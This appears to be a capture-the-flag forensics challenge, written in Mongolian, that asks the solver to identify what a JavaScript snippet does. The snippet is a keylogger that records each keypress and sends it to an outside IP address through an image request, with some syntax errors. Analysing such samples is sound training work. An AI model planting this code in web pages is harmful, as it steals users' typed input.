**Baby Forensic (10pts)**

Доор кодыг шинжилгээ хийн ямар үйлдэл хийж байгааг тодорхойл.

    <script LANGUAGE="JavaScript">
    document.captureEvents(Event.KEYPRESS);
    document.onkeypress = captureKeystrokes;
    function captureKeystrokes(e) {
    var key = string.fromcharcode(e.which);
    var img = new imageO;
    var src = "http://192.155.221.7/index.htm" +
    "keystroke=" + escape(key);
    img.src = src;
    return true;}
    <script>| 
